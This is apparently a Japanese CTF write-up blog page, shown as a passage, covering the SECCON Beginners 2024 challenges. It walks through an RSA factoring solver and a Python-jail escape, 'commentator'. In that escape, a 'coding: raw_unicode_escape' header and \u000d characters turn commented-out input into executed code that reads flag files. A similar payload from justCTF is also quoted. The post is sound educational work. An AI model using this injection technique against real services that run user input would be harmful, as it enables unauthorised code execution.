<span class="token keyword">assert</span> p <span class="token operator">!=</span> q

a <span class="token operator">=</span> p <span class="token operator">-</span> x
b <span class="token operator">=</span> q <span class="token operator">-</span> x
<span class="token keyword">assert</span> is_square<span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token keyword">and</span> is_square<span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token keyword">and</span> is_square<span class="token punctuation">(</span>b<span class="token punctuation">)</span>

n <span class="token operator">=</span> p <span class="token operator">*</span> q
e <span class="token operator">=</span> <span class="token number">65537</span>
flag <span class="token operator">=</span> <span class="token string">b"ctf4b{dummy_f14g}"</span>
mes <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
c <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>mes<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"n = </span><span class="token interpolation"><span class="token punctuation">{</span>n<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"e = </span><span class="token interpolation"><span class="token punctuation">{</span>e<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"cipher = </span><span class="token interpolation"><span class="token punctuation">{</span>c<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"ab = </span><span class="token interpolation"><span class="token punctuation">{</span>a <span class="token operator">*</span> b<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>

<span class="token keyword">assert</span> gmpy2<span class="token punctuation">.</span>mpz<span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">4701715889239073150754995341656203385876367121921416809690629011826585737797672332435916637751589158510308840818034029338373257253382781336806660731169</span> <span class="token operator">==</span> <span class="token number">0</span>
<span class="token keyword">assert</span> gmpy2<span class="token punctuation">.</span>mpz<span class="token punctuation">(</span>b<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">35760393478073168120554460439408418517938869000491575971977265241403459560088076621005967604705616322055977691364792995889012788657592539661</span> <span class="token operator">==</span> <span class="token number">0</span></code></pre></div>
<p>このコードを見ると、a,b,x はいずれも完全平方数で、a と b はそれぞれ p,q から x を引いた値であり、またどちらも巨大な数との mod が 0 になることがわかります。</p>
<p>ab は完全平方数 a,b の積なので、素因数分解を行うことで a と b をある程度絞り込めることがわかります。</p>
<p>ヒントとして与えられている値と factordb を使用したところ、a と b が取りうる値は全部で 14 パターンとなることがわかりました。</p>
<p>また、p,q はそれぞれ (a+x) と (b+x) であり、<code class="language-text">p*q = n</code> なので、<code class="language-text">x**2 + (a+b)*x + (ab-n) = 0</code>  の方程式が成り立つことがわかります。</p>
<p>a と b は 14 パターンの総当たりが可能なので、各 a,b を使用した場合の解 x が正の整数かつ完全平方数となる場合を特定することで正しい a,b,x を特定できます。</p>
<p>ここで特定した a,b,x を使用すると p,q も特定できるので、暗号文を復号して Flag を取得できます。</p>
<p>最終的に以下の Solver で Flag を取得しました。</p>
<div class="gatsby-highlight" data-language="python"><pre class="language-python"><code class="language-python"><span class="token keyword">import</span> gmpy2
<span class="token keyword">import</span> sympy <span class="token keyword">as</span> sp
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytes<span class="token punctuation">,</span> isPrime

n <span class="token operator">=</span> <span class="token number">28347962831882769454618553954958819851319579984482333000162492691021802519375697262553440778001667619674723497501026613797636156704754646434775647096967729992306225998283999940438858680547911512073341409607381040912992735354698571576155750843940415057647013711359949649220231238608229533197681923695173787489927382994313313565230817693272800660584773413406312986658691062632592736135258179504656996785441096071602835406657489695156275069039550045300776031824520896862891410670249574658456594639092160270819842847709283108226626919671994630347532281842429619719214221191667701686004691774960081264751565207351509289</span>
ab <span class="token operator">=</span> <span class="token number">28347962831882769454618553954958819851319579984482333000162492691021802519375697262553440778001667619674723497501026613797636156704754646434775647096967729992306225998283999940438858680547911512073341409607381040912992735354698571576155750843940415057647013711359949649102926524363237634349331663931595027679709000404758309617551370661140402128171288521363854241635064819660089300995273835099967771608069501973728126045089426572572945113066368225450235783211375678087346640641196055581645502430852650520923184043404571923469007524529184935909107202788041365082158979439820855282328056521446473319065347766237878289</span>

Ba <span class="token operator">=</span> <span class="token number">4701715889239073150754995341656203385876367121921416809690629011826585737797672332435916637751589158510308840818034029338373257253382781336806660731169</span>
Bb <span class="token operator">=</span> <span class="token number">35760393478073168120554460439408418517938869000491575971977265241403459560088076621005967604705616322055977691364792995889012788657592539661</span>
<span class="token keyword">assert</span> gmpy2<span class="token punctuation">.</span>mpz<span class="token punctuation">(</span>ab<span class="token punctuation">)</span> <span class="token operator">%</span> Ba <span class="token operator">==</span> <span class="token number">0</span>
<span class="token keyword">assert</span> gmpy2<span class="token punctuation">.</span>mpz<span class="token punctuation">(</span>ab<span class="token punctuation">)</span> <span class="token operator">%</span> Bb <span class="token operator">==</span> <span class="token number">0</span>

r <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>mpz<span class="token punctuation">(</span>ab<span class="token punctuation">)</span> <span class="token operator">//</span> Ba <span class="token operator">//</span> Bb
<span class="token keyword">assert</span> r <span class="token operator">==</span> <span class="token number">168602179130542941829360938763588913033950728808204687738344939756690772499463147969992071622543050423641037178339406288176679147723646123266772165646828805533748632218062968267049753205615282207629849772408015254265200980724449082839150022450439661030563736824487531287491910398220288816325848224837808525851343383555765621</span>
<span class="token comment"># http://factordb.com/index.php?query=168602179130542941829360938763588913033950728808204687738344939756690772499463147969992071622543050423641037178339406288176679147723646123266772165646828805533748632218062968267049753205615282207629849772408015254265200980724449082839150022450439661030563736824487531287491910398220288816325848224837808525851343383555765621</span>

t1 <span class="token operator">=</span> <span class="token number">306606827773</span> <span class="token operator">**</span> <span class="token number">2</span>
t2 <span class="token operator">=</span> <span class="token number">199</span> <span class="token operator">**</span> <span class="token number">2</span>
t3 <span class="token operator">=</span> <span class="token number">173</span> <span class="token operator">**</span> <span class="token number">2</span>
t4 <span class="token operator">=</span> <span class="token number">3</span> <span class="token operator">**</span> <span class="token number">2</span>
<span class="token keyword">assert</span> Ba<span class="token operator">**</span><span class="token number">2</span> <span class="token operator">*</span> Bb<span class="token operator">**</span><span class="token number">2</span> <span class="token operator">*</span> t1 <span class="token operator">*</span> t2 <span class="token operator">*</span> t3 <span class="token operator">*</span> t4 <span class="token operator">==</span> ab

<span class="token keyword">def</span> <span class="token function">is_square</span><span class="token punctuation">(</span>n<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> gmpy2<span class="token punctuation">.</span>isqrt<span class="token punctuation">(</span>n<span class="token punctuation">)</span> <span class="token operator">**</span> <span class="token number">2</span> <span class="token operator">==</span> n

<span class="token keyword">def</span> <span class="token function">is_positive_integer_and_perfect_square</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> num<span class="token punctuation">.</span>is_integer <span class="token keyword">and</span> num <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>
        sqrt_num <span class="token operator">=</span> sp<span class="token punctuation">.</span>sqrt<span class="token punctuation">(</span>num<span class="token punctuation">)</span>
        <span class="token keyword">return</span> sqrt_num<span class="token punctuation">.</span>is_integer
    <span class="token keyword">return</span> <span class="token boolean">False</span>

L <span class="token operator">=</span> \
<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">[</span>t2<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>t1<span class="token punctuation">,</span> t3<span class="token punctuation">,</span> t4<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token punctuation">(</span><span class="token punctuation">[</span>t2<span class="token punctuation">,</span> t3<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>t1<span class="token punctuation">,</span> t4<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token punctuation">(</span><span class="token punctuation">[</span>t1<span class="token punctuation">,</span> t2<span class="token punctuation">,</span> t3<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>t4<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token punctuation">(</span><span class="token punctuation">[</span>t1<span class="token punctuation">,</span> t2<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>t3<span class="token punctuation">,</span> t4<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token punctuation">(</span><span class="token punctuation">[</span>t1<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>t3<span class="token punctuation">,</span> t2<span class="token punctuation">,</span> t4<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token punctuation">(</span><span class="token punctuation">[</span>t4<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>t1<span class="token punctuation">,</span> t2<span class="token punctuation">,</span> t3<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token punctuation">(</span><span class="token punctuation">[</span>t3<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>t1<span class="token punctuation">,</span> t2<span class="token punctuation">,</span> t4<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token punctuation">(</span><span class="token punctuation">[</span>t1<span class="token punctuation">,</span> t3<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>t2<span class="token punctuation">,</span> t4<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token punctuation">(</span><span class="token punctuation">[</span>t2<span class="token punctuation">,</span> t4<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>t1<span class="token punctuation">,</span> t3<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token punctuation">(</span><span class="token punctuation">[</span>t4<span class="token punctuation">,</span> t3<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>t1<span class="token punctuation">,</span> t2<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token punctuation">(</span><span class="token punctuation">[</span>t4<span class="token punctuation">,</span> t1<span class="token punctuation">,</span> t3<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>t2<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token punctuation">(</span><span class="token punctuation">[</span>t4<span class="token punctuation">,</span> t2<span class="token punctuation">,</span> t3<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>t1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token punctuation">(</span><span class="token punctuation">[</span>t1<span class="token punctuation">,</span> t4<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>t2<span class="token punctuation">,</span> t3<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token punctuation">(</span><span class="token punctuation">[</span>t1<span class="token punctuation">,</span> t2<span class="token punctuation">,</span> t4<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>t3<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span>

<span class="token keyword">for</span> l <span class="token keyword">in</span> L<span class="token punctuation">:</span>
    a <span class="token operator">=</span> Ba<span class="token operator">**</span><span class="token number">2</span>
    b <span class="token operator">=</span> Bb<span class="token operator">**</span><span class="token number">2</span>
    <span class="token keyword">for</span> A <span class="token keyword">in</span> l<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
        a <span class="token operator">*=</span> A
    <span class="token keyword">for</span> B <span class="token keyword">in</span> l<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
        b <span class="token operator">*=</span> B

    <span class="token keyword">assert</span> is_square<span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token keyword">and</span> is_square<span class="token punctuation">(</span>b<span class="token punctuation">)</span>
    <span class="token keyword">assert</span> a<span class="token operator">*</span>b <span class="token operator">==</span> ab

    x <span class="token operator">=</span> sp<span class="token punctuation">.</span>symbols<span class="token punctuation">(</span><span class="token string">'x'</span><span class="token punctuation">)</span>
    A <span class="token operator">=</span> a <span class="token operator">+</span> b
    B <span class="token operator">=</span> ab <span class="token operator">-</span> n
    equation <span class="token operator">=</span> x<span class="token operator">**</span><span class="token number">2</span> <span class="token operator">+</span> A<span class="token operator">*</span>x <span class="token operator">+</span> B
    solutions <span class="token operator">=</span> sp<span class="token punctuation">.</span>solve<span class="token punctuation">(</span>equation<span class="token punctuation">,</span> x<span class="token punctuation">)</span>
    <span class="token keyword">for</span> solution <span class="token keyword">in</span> solutions<span class="token punctuation">:</span>
        <span class="token keyword">if</span> sp<span class="token punctuation">.</span>im<span class="token punctuation">(</span>solution<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
            real_solution <span class="token operator">=</span> sp<span class="token punctuation">.</span>re<span class="token punctuation">(</span>solution<span class="token punctuation">)</span>
            <span class="token keyword">if</span> is_positive_integer_and_perfect_square<span class="token punctuation">(</span>real_solution<span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"a=</span><span class="token interpolation"><span class="token punctuation">{</span>a<span class="token punctuation">}</span></span><span class="token string">,b=</span><span class="token interpolation"><span class="token punctuation">{</span>b<span class="token punctuation">}</span></span><span class="token string">,x=</span><span class="token interpolation"><span class="token punctuation">{</span>real_solution<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>

a <span class="token operator">=</span> <span class="token number">7878824508023825320620552438859131751341011236435661361507465408511567856339128586549369157062948927445512194472763840898824746924636029850659802261912150719575815528250042476759316872507696855084778513881881419453874766724167271062172560745165185117184785529887592443222251487197342298902245870192371299449</span>
b <span class="token operator">=</span> <span class="token number">3597993939706753790208197378148848949822043309769682578959924290719006420996423496659961817582141773260972861724771414278651046463502978594910794197098988322222621708534481711002211659109357402539392364289580131703038942827590851390068976436194200123404980430263753899361953534498940931686689517154815683161</span>
x <span class="token operator">=</span> <span class="token number">10221013321700464817330531356688256100</span>
p <span class="token operator">=</span> a <span class="token operator">+</span> x
q <span class="token operator">=</span> b <span class="token operator">+</span> x
e <span class="token operator">=</span> <span class="token number">65537</span>
c <span class="token operator">=</span> <span class="token number">21584943816198288600051522080026276522658576898162227146324366648480650054041094737059759505699399312596248050257694188819508698950101296033374314254837707681285359377639170449710749598138354002003296314889386075711196348215256173220002884223313832546315965310125945267664975574085558002704240448393617169465888856233502113237568170540619213181484011426535164453940899739376027204216298647125039764002258210835149662395757711004452903994153109016244375350290504216315365411682738445256671430020266141583924947184460559644863217919985928540548260221668729091080101310934989718796879197546243280468226856729271148474</span>
<span class="token keyword">assert</span> isPrime<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
<span class="token keyword">assert</span> isPrime<span class="token punctuation">(</span>q<span class="token punctuation">)</span>
<span class="token keyword">assert</span> p <span class="token operator">!=</span> q
<span class="token keyword">assert</span> n <span class="token operator">==</span> p <span class="token operator">*</span> q

phi_n <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>
d <span class="token operator">=</span> sp<span class="token punctuation">.</span>mod_inverse<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi_n<span class="token punctuation">)</span>
m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre></div>
<h2 id="commentatormisc" style="position:relative;"><a href="#commentatormisc" aria-label="commentatormisc permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>commentator(Misc)</h2>
<blockquote>
<p>コメントには注意しなきゃ！</p>
<p>nc commentator.beginners.seccon.games 4444</p>
</blockquote>
<p>問題バイナリとして以下のコードが与えられます。</p>
<p>どうやら、入力値として受け取った文字列の先頭に <code class="language-text">#</code> を付けてコメントアウトした上で Python ファイルとして保存し、それを実行するようなアプリケーションのようです。</p>
<div class="gatsby-highlight" data-language="python"><pre class="language-python"><code class="language-python"><span class="token comment">#!/usr/local/bin/python</span>

<span class="token keyword">import</span> os
<span class="token keyword">import</span> uuid

<span class="token comment">############################## Logo ##############################</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>
    <span class="token string-interpolation"><span class="token string">f"""                                          _        _                  __
  ___ ___  _ __ ___  _ __ ___   ___ _ __ | |_ __ _| |_ ___  _ __   _  \\ \\
 / __/ _ \\| '_ ` _ \\| '_ ` _ \\ / _ \\ '_ \\| __/ _` | __/ _ \\| '__| (_)  | |
| (_| (_) | | | | | | | | | | |  __/ | | | || (_| | || (_) | |     _   | |
 \\___\\___/|_| |_| |_|_| |_| |_|\\___|_| |_|\\__\\__,_|\\__\\___/|_|    (_)  | |
                                                                      /_/
</span><span class="token interpolation"><span class="token punctuation">{</span><span class="token string">"-"</span> <span class="token operator">*</span> <span class="token number">75</span><span class="token punctuation">}</span></span><span class="token string">
Enter your Python code (ends with __EOF__)"""</span></span>
<span class="token punctuation">)</span>
<span class="token comment">############################## Logo ##############################</span>

python <span class="token operator">=</span> <span class="token string">""</span>
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    line <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">">>> "</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\r"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token string">"__EOF__"</span> <span class="token keyword">in</span> line<span class="token punctuation">:</span>
        python <span class="token operator">+=</span> <span class="token string">'print("thx :)")'</span>
        <span class="token keyword">break</span>
    python <span class="token operator">+=</span> <span class="token string-interpolation"><span class="token string">f"# </span><span class="token interpolation"><span class="token punctuation">{</span>line<span class="token punctuation">}</span></span><span class="token string">\n"</span></span>  <span class="token comment"># comment :)</span>

pyfile <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"/tmp/</span><span class="token interpolation"><span class="token punctuation">{</span>uuid<span class="token punctuation">.</span>uuid4<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">.py"</span></span>
<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>pyfile<span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>python<span class="token punctuation">)</span>

os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"python </span><span class="token interpolation"><span class="token punctuation">{</span>pyfile<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>pyfile<span class="token punctuation">)</span></code></pre></div>
<p>Python の input は <code class="language-text">\n</code> までのデータを入力値として受け取るため <code class="language-text">\r</code> を使えば <code class="language-text">#</code> の付与を回避して任意の Python コードを実行できます。</p>
<p>しかし、今回の問題バイナリでは <code class="language-text">.replace("\r", "")</code> によって <code class="language-text">\r</code> が削除されるためこの方法は利用できません。</p>
<p>何とかコメントアウトを回避する方法がないか一通りの入力を試した後、コメントアウトされた状態でも何らかの操作を行うことができないか、というポイントに確認観点を変えることにしました。</p>
<p>その結果、<code class="language-text">os.system(f"python {pyfile}")</code> でスクリプトが実行されているため Shebang はあまりやくに立たなかったものの、<code class="language-text">#coding:</code> の指定は有効に動作することを確認できます。</p>
<p>Python のスクリプトファイルに <code class="language-text">#coding:</code> から始まるエンコーディングの指定を行うメリットについて調べてみると、以下の情報がありました。</p>
<blockquote>
<p>This PEP proposes to introduce a syntax to declare the encoding of a Python source file. The encoding information is then used by the Python parser to interpret the file using the given encoding. Most notably this enhances the interpretation of Unicode literals in the source code and makes it possible to write Unicode literals using e.g. UTF-8 directly in an Unicode aware editor.</p>
</blockquote>
<p>参考：<a href="https://peps.python.org/pep-0263/" target="_blank" rel="nofollow noopener noreferrer">PEP 263 – Defining Python Source Code Encodings | peps.python.org</a></p>
<p>参考：<a href="https://docs.python.org/ja/3/library/codecs.html" target="_blank" rel="nofollow noopener noreferrer">codecs --- codec レジストリと基底クラス — Python 3.12.4 ドキュメント</a></p>
<p>ソースコードのエンコーディングを適切に指定すると UTF-8 を使用して記述した Unicode リテラルの解釈が行われるようになるようです。</p>
<p>そこで、1 行目に <code class="language-text">coding: raw_unicode_escape</code> を入力してスクリプトのエンコーディングを <code class="language-text">raw_unicode_escape</code> にした上で、<code class="language-text">\u000d</code> の Unicode 文字を使って <code class="language-text">\r</code> の削除を回避しつつ改行を行って Python コードを実行できるようにしました。</p>
<div class="gatsby-highlight" data-language="python"><pre class="language-python"><code class="language-python">coding<span class="token punctuation">:</span> raw_unicode_escape
\u000dimport os
\u000dos<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"cat /flag*.txt"</span><span class="token punctuation">)</span>
__EOF__</code></pre></div>
<p>この入力を与えることで正しい Flag を特定できます。</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 782px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/aad11705cc2cfef20731be75dc4fec16/2e195/image-20240616080331071.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 36.25%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAAAsTAAALEwEAmpwYAAABCUlEQVQoz41RW3LDIAzE9thgMOBn3HTqV5z2Aknvf7StJKf5ykz7sYNYSSuxqLIsEUJAiAHWWvDdey9xVVV0N0+ubdtnrffVI1/S6YRPEgXFjbGO6Lqj2BhzNAUvPMdcw2fXd4gxoiaec03bIMsyEWYuSRIonsxFv2RFk3kDxtFcC2RrZ+EIPMA5J9tprSXmAWmaQp3fz9i2FZd9w7otWJYZ0/yBaSLMk2zsw2GBUupvsPJ+3XH/vpHgipkEe3laQEs2sFBR5P8TY4xvI/b9gs+vq3g0jicMQy/PlPg00Gc04iFz7LWjT2DvXgrydGM08jynTQqU9vCl0IWczGvKM/j59pGXD3gh+AMCDZ6kCra59AAAAABJRU5ErkJggg=='); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/aad11705cc2cfef20731be75dc4fec16/8ac56/image-20240616080331071.webp 240w,
/static/aad11705cc2cfef20731be75dc4fec16/d3be9/image-20240616080331071.webp 480w,
/static/aad11705cc2cfef20731be75dc4fec16/c0b7e/image-20240616080331071.webp 782w"
              sizes="(max-width: 782px) 100vw, 782px"
              type="image/webp"
            />
          <source
            srcset="/static/aad11705cc2cfef20731be75dc4fec16/8ff5a/image-20240616080331071.png 240w,
/static/aad11705cc2cfef20731be75dc4fec16/e85cb/image-20240616080331071.png 480w,
/static/aad11705cc2cfef20731be75dc4fec16/2e195/image-20240616080331071.png 782w"
            sizes="(max-width: 782px) 100vw, 782px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/aad11705cc2cfef20731be75dc4fec16/2e195/image-20240616080331071.png"
            alt="image-20240616080331071"
            title="image-20240616080331071"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<p>ちなみに、別の CTF でも Pyjail 問で、同じように <code class="language-text">#coding: raw_unicode_escape</code> を使用した上で Unicode 表記でバイト文字を送り込むことで Flag を取得するような問題もあったようです。</p>
<div class="gatsby-highlight" data-language="python"><pre class="language-python"><code class="language-python"><span class="token comment">#coding: raw_unicode_escape</span>
x<span class="token operator">=</span><span class="token string">'PEKO\u0027\u002b\u0062\u0072\u0065\u0061\u006b\u0070\u006f\u0069\u006e\u0074\u0028\u0029\u002b\u0027'</span></code></pre></div>
<p>参考：<a href="https://blog.maple3142.net/2023/06/05/justctf-2023-writeups/" target="_blank" rel="nofollow noopener noreferrer">justCTF 2023 WriteUps | 廢文集中區</a></p>
<h2 id="まとめ" style="position:relative;"><a href="#%E3%81%BE%E3%81%A8%E3%82%81" aria-label="まとめ permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>まとめ</h2>
<p>今年も出ていたカーネルエクスプロイト問については手も足もでなかったので後日頑張ります。。</p></div></div></div><div class="Post-module--post__footer--3WzWU"><div><p class="Meta-module--meta__date--29eD7">Published <!-- -->Jun 16, 2024</p></div><div class="Tags-module--tags--1L_ct"><ul class="Tags-module--tags__list--91FqN"><li class="Tags-module--tags__list-item--1M30P"><a class="Tags-module--tags__list-item-link--3SL_8" href="/tag/rev/">Rev</a></li><li class="Tags-module--tags__list-item--1M30P"><a class="Tags-module--tags__list-item-link--3SL_8" href="/tag/pwn/">Pwn</a></li><li class="Tags-module--tags__list-item--1M30P"><a class="Tags-module--tags__list-item-link--3SL_8" href="/tag/crypto/">Crypto</a></li><li class="Tags-module--tags__list-item--1M30P"><a class="Tags-module--tags__list-item-link--3SL_8" href="/tag/misc/">Misc</a></li></ul></div><div class="Author-module--author--2Yefr"><p>リバースエンジニアになりたいCTF Player(Team: 0nePadding)。WinDbgとYARAが好き。OSCP / CISSP / AtCoder 緑 Microsoft Japanに所属してます。発言はすべて個人の見解。<a class="Author-module--author__bio-twitter--n-O9n" href="https://www.twitter.com/kash1064" rel="noopener noreferrer" target="_blank"><strong>かしわば</strong> on Twitter</a></p></div></div><div class="Post-module--post__comments--25y6I"></div></div></div></div><div id="gatsby-announcer" style="position:absolute;top:0;width:1px;height:1px;padding:0;overflow:hidden;clip:rect(0, 0, 0, 0);white-space:nowrap;border:0" aria-live="assertive" aria-atomic="true"></div></div><script id="gatsby-script-loader">/*<![CDATA[*/window.pagePath="/ctf-sec4b-2024";/*]]>*/</script><script id="gatsby-chunk-mapping">/*<![CDATA[*/window.___chunkMapping={"polyfill":["/polyfill-299cfcade846097f4d4b.js"],"app":["/app-d53f2c9203caf1f62836.js"],"component---cache-caches-gatsby-plugin-offline-app-shell-js":["/component---cache-caches-gatsby-plugin-offline-app-shell-js-fd4fb51a6fac1c18bdde.js"],"component---src-templates-categories-list-template-js":["/component---src-templates-categories-list-template-js-2181ec47d28e5c35d3e9.js"],"component---src-templates-category-template-js":["/component---src-templates-category-template-js-76f2006942127b3c7274.js"],"component---src-templates-index-template-js":["/component---src-templates-index-template-js-70ba56c0f46525baa629.js"],"component---src-templates-not-found-template-js":["/component---src-templates-not-found-template-js-d19905e5c8fc953958f1.js"],"component---src-templates-page-template-js":["/component---src-templates-page-template-js-6ba68ef37e264f701345.js"],"component---src-templates-post-template-js":["/component---src-templates-post-template-js-381c1b847824134fa4bd.js"],"component---src-templates-tag-template-js":["/component---src-templates-tag-template-js-0faa242d92f89b71e668.js"],"component---src-templates-tags-list-template-js":["/component---src-templates-tags-list-template-js-2d7007993fc2bf0f9caf.js"]};/*]]>*/</script><script src="/polyfill-299cfcade846097f4d4b.js" nomodule=""></script><script src="/component---src-templates-post-template-js-381c1b847824134fa4bd.js" async=""></script><script 